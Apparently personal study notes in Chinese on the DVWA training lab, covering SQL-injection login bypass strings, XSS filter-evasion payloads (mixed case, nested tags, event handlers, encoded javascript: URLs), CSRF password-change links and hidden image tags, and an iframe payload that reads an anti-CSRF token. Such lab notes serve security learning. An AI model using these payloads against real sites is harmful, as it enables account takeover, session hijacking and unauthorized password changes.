# dvwa

## bruteforce

### level：low  
<b>1.注入方式：</b>
-   源码：query  = "SELECT * FROM \`users\` WHERE user = '\$user' AND password = '\$pass';"   
-    admin' #  &emsp;或者	&emsp;admin' -- a   &emsp;或者&emsp; a' or '1' = '1' limit 1 #

### level:medium

<b>1.暴力破解 </b> 
-   burpsuit intruder
-   MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义
---
##  xss

1.  窃取cookie
2.  劫持流量恶意跳转
3.  xss的利用和绕过  
     -  大小写绕过
         -  这个绕过方式的出现是因为网站仅仅只过滤了`<script>`标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。具体的方式就像这样：`<sCript>alert("hey!")</scRipt>`
    -  利用过滤后返回语句再次构成攻击语句来绕过
        -  `<sCri<script>pt>alert("hey!")</scRi</script>pt>`
    -  并不是只有script标签才可以插入代码
        -  `<img src='w.123' onerror='alert("hey!")'>`
        -  `<a onmousemove=alert(1)> `
        -  `<div onmouseover=‘do something here’> `
    -  编码脚本代码绕过关键字过滤
        -  `<script>eval(\u0061\u006c\u0065\u0072\u0074(1))</script>`
    -   主动闭合标签实现注入代码
    -   html实体编码
        -   `<iframe src=javascript:alert(1)>`
        -   `<iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>`
    -   URL编码
        -   `<iframe src=”javascript:alert(1)”>test</iframe>`
        -   `<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>`
        -   Javascript解析器工作的时候将`\u0061\u006c\u0065\u0072\u0074`进行js解码后为”`alert`”，但是需要注意像圆括号、双引号、单引号不能编码，否则在这种场景下无法弹窗。
4.  xss编码详情
    -   <a href="xss.md">编码相关</a>
---
### 1.  反射型xss

- ####   level:medium
  -   要闭合 `<option><select>`标签

- ####   level:high
    - URL的部分发往服务器时#号后面的并不会发送到服务器，但是javascript代码还会正常读取，所以利用这个特性来绕过服务器端的检查。

---
## csrf

-   ### 简介
    - CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。

-   ### level ：low
    -   构造链接  如：`http://192.168.32.215/dvwa/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#` 缺点是容易被发现，所以可以将上面的链接转换成短链接。  
    -   构造一个网页，添加标签：`<img src="http://192.168.32.215/dvwa/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/> `  
    用图片这种格式会保证最后结果不会回显给用户
    -   要保证使用此链接的时候，有当前用户的cookie……更换浏览器会使cookie失效
    -   同时，可以把刚才的链接放在一个网页中（服务器中），此服务器有一个短的域名。
-   ### level:medium
    -   过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.153.130）
    -   将攻击的网页 命名为 host.html 则可以
-   ### level：high
    -   可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。
    -   同时由于同源策略，攻击者无法获取返回页面的token。
    -   在xss界面构造payload` <iframe src=../csrf onload=alert(frames[0].document.getElementsByName('user_token')[0].value)>`获取token
    -   个人想法：通过xss构造payload携带cookie，token访问本机的某个页面，这个页面在通过cookie和token去攻击。